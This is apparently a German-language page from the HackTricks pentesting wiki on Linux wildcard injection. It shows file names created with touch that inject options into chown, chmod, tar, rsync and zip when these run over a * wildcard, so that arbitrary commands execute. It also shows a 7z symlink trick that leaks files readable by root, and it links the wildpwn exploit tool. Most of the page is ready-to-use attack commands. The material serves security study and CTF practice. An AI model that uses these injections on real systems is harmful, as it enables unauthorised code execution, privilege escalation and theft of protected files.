{{#include ../../banners/hacktricks-training.md}}

## chown, chmod

Sie können **angeben, welchen Dateibesitzer und welche Berechtigungen Sie für die restlichen Dateien kopieren möchten**
```bash
touch "--reference=/my/own/path/filename"
```
Sie können dies mit [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(kombinierter Angriff)_ ausnutzen.\
Weitere Informationen finden Sie unter [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## Tar

**Führen Sie beliebige Befehle aus:**
```bash
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Sie können dies ausnutzen, indem Sie [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(tar-Angriff)_\
Weitere Informationen finden Sie unter [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## Rsync

**Führen Sie beliebige Befehle aus:**
```bash
Interesting rsync option from manual:

-e, --rsh=COMMAND           specify the remote shell to use
--rsync-path=PROGRAM    specify the rsync to run on remote machine
```

```bash
touch "-e sh shell.sh"
```
Sie können dies ausnutzen, indem Sie [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(\_rsync \_attack)_\
Weitere Informationen finden Sie unter [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## 7z

In **7z** können Sie selbst mit `--` vor `*` (beachten Sie, dass `--` bedeutet, dass die folgenden Eingaben nicht als Parameter behandelt werden können, sondern in diesem Fall nur als Dateipfade) einen beliebigen Fehler verursachen, um eine Datei zu lesen. Wenn also ein Befehl wie der folgende von root ausgeführt wird:
```bash
7za a /backup/$filename.zip -t7z -snl -p$pass -- *
```
Und Sie können Dateien im Ordner erstellen, in dem dies ausgeführt wird. Sie könnten die Datei `@root.txt` und die Datei `root.txt` erstellen, die ein **symlink** zu der Datei ist, die Sie lesen möchten:
```bash
cd /path/to/7z/acting/folder
touch @root.txt
ln -s /file/you/want/to/read root.txt
```
Dann wird **7z** beim Ausführen `root.txt` als eine Datei behandeln, die die Liste der Dateien enthält, die es komprimieren soll (das zeigt die Existenz von `@root.txt` an), und wenn 7z `root.txt` liest, wird es `/file/you/want/to/read` lesen und **da der Inhalt dieser Datei keine Liste von Dateien ist, wird es einen Fehler ausgeben**, der den Inhalt zeigt.

_Mehr Infos in den Write-ups der Box CTF von HackTheBox._

## Zip

**Führe beliebige Befehle aus:**
```bash
zip name.zip files -T --unzip-command "sh -c whoami"
```
{{#include ../../banners/hacktricks-training.md}}
